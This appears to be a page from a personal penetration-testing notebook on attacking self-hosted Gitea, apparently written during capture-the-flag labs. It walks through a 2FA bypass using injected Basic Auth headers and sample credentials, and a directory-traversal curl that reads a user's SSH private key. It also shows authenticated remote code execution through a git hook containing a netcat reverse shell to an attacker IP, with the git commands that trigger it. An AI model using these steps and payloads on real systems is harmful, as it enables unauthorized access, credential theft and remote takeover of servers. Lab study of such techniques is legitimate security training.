<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Gitea</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Gitea</h1><br/><p><h1>Background</h1></p><p>Written in Go, &amp; is similar to GitHub, Bitbucket, and <a href="Recon_+_Services--WebApp--Software--GitLab_49.html">GitLab</a>. It&#39;s an open-source, self-hosted software development service.</p><p></p><p>The Gitea version should be visible at the bottom of the page.</p><p></p><p>You can often register a new account, which helps for exploits that require Auth, but it&#39;ll probably be low privilege which means it may not work for all Authenticated exploits.</p><p></p><p>IME it&#39;s often only accessible locally, so you need to use something like a Chisel Proxy &amp; FoxyProxy to access it.</p><p></p><p><h1>Enumeration</h1></p><p>Check for other users to learn usernames, &amp; look at their public Repos to see what SW could be used (&amp; whether their are hardcoded creds in current or previous versions which could be re-used elsewhere).</p><p></p><p>Look at the top of the page for the <strong>Explore</strong> button.</p><p></p><p></p><p><h1>Exploitation</h1></p><p><h2>Bypass 2FA</h2></p><p>Contradictory messages about affected versions. One post said &lt;1.8.0 &amp; then demonstrated how it could be done on 1.13.0.</p><p></p><p>Use HTTP Basic Auth as shown <a href="https://shishirsubedi.com.np/thm/yearofthedog/">here</a>.</p><p></p><p><h3>Convert Credentials to Base64</h3></p><p><em>echo -n &quot;dylan:Labr4d0rs4L1f3&quot; | base64</em></p><p></p><p><h3>Add Header</h3></p><p>[CTF B 184]</p><p></p><p>An easy method is to use the Burpsuite extension <strong>Add Custom Header</strong>. You can set <a href="Pivoting_22.html#Connecting to Proxy">burpsuite</a> up to use a SOCKS proxy if you need to access the server locally.</p><p></p><p><strong>Header Name:</strong> Authorizartion</p><p><strong>Header Value: </strong>Basic</p><p><strong>Hard Coded Value:</strong> SPACE_THEN_B64</p><p></p><p>Click <strong>Update Preview</strong></p><p></p><p><span class="subheading">Create Rule</span>: Create a rule in burpsuite to apply this HTTP Header to traffic when using <strong>Foxy Proxy</strong> or burp&#39;s browser.</p><p></p><p><strong>Settings</strong> → <strong>Project</strong> (Tab at the top) → <strong>Project</strong> ↓ <strong>Sessions</strong> ↓ <strong>Add Session Handling Rule</strong></p><p></p><p><strong>Rule Actions</strong> ↓ <strong>Add</strong> ↓ <strong>Invoke a Burp Extension</strong> → <strong>Add a Custom Header</strong> (Under Details)</p><p></p><p><strong>Scope</strong>: Select all except <strong>Extender</strong> for <strong>Tools Scope</strong> (<strong>Proxy</strong> is the important one).</p><p></p><p><strong>URL Scope</strong> → <strong>Use Custom Scope</strong> ↓ <strong>http://127.0.0.1:3000</strong> &amp; click <strong>OK</strong> (If burp is setup to use SOCKS Proxy to access target&#39;s Gitea server at 127.0.0.1:3000).</p><p></p><p><span class="subheading">Result</span>: While using Foxy Proxy, you can hit <strong>F5</strong> to reload page without cache. You should now be authenticated.</p><p></p><p><a name="Disable 2FA"></a><h3>Disable 2FA</h3></p><p>After Bypassing 2FA, it&#39;s useful to disable it. This will let you interact with Gitea via CLi &amp; perform additional exploits.</p><p></p><p>While authenticated as target user, clock on the Profile Icon at the top left of the page &amp; click <strong>Settings</strong> → <strong>Security</strong> ↓ <strong>Disable 2FA</strong></p><p></p><p><h2>Directory Traversal (&lt;1.13.6)</h2></p><p><a href="https://security.snyk.io/vuln/SNYK-GOLANG-CODEGITEAIOGITEAROUTERS-2426368">CVE-2021-29134</a></p><p></p><p>Also allows the attacker to create or replace existing files. This type of vulnerability is also known as <strong>Zip-Slip</strong>.</p><p></p><p><em>curl http://localhost:3000/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/dylan/.ssh/id_rsa</em></p><p></p><p><h2>Authenticated</h2><h2> </h2><h2>RCE (1.1.0 - 1.13)</h2></p><p>The user account must have the <span style="color:#ff0000;">privileges required to create Git Hooks</span>. The PoC for <a href="https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce">CVE-2020-14144</a> seems to be less reliable than manual exploitation.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Git Hooks aren&#39;t the same as Web Hooks, &amp; are found in a different location!</p><p></p><p><h3>Manual Exploitation</h3></p><p>The Git Hooks you&#39;ll create are for a specific Repo. IDK if other typers of hooks are useful, but I created a <strong>pre-receive</strong> hook.</p><p></p><p><span class="subheading">Create Hook</span>: Navigate to one of your Repos (create a new one if needed)</p><p></p><p><strong>Settings</strong> (Top left in Repo, after <strong>code</strong>, etc) ↓ <strong>Git Hooks</strong> ↓ <strong>pre-receive</strong> &amp; click <strong>Edit</strong> button (pencil icon)</p><p></p><p><span class="subheading">Add Payload</span>: Try different Reverse Shell Payloads (e.g. bash payload failed for me, but netcat payload worked).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: You may be able to add multiple payloads on different lines; this way if 1 fails, it may go down the list &amp; try each of them until 1 works (IDK if this is a reliable method).</p><p></p><p><em>#!/bin/sh</em><em></em></p><p><em>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.144.68 443 &gt;/tmp/f</em></p><p></p><p><span class="subheading">Trigger Git Hook</span>: You need to <a href="Recon_+_Services--WebApp--Software--Gitea_79.html#Disable 2FA">Disable 2FA</a> to use CLi. You may be able to trigger the payload using your browser or remotely via CLi, but I used SSH access to run these commands locally.</p><p></p><p>Clone the target Repo, make an arbitrary change, &amp; push the commit. This should trigger the Git Hook &amp; run the payload. For example,</p><p></p><p><em>git clone http://127.0.0.1:3000/Dylan/Test-Repo.git &amp;&amp; cd ./Test-Repo</em></p><p></p><p><em>touch evil.txt; git add evil.txt; git commit -m “file evil.txt added”; git push origin master</em></p><p></p><p><h1>Local Access to Server</h1></p><p>If you have access to the host&#39;s file system, you may be able to perform some of the enumeration techniques that work for <a href="PrivEsc--Linux_29.html#github">Github Repos</a> (<strong>.git</strong>). Some won&#39;t work.</p></div>
</body>
</html>
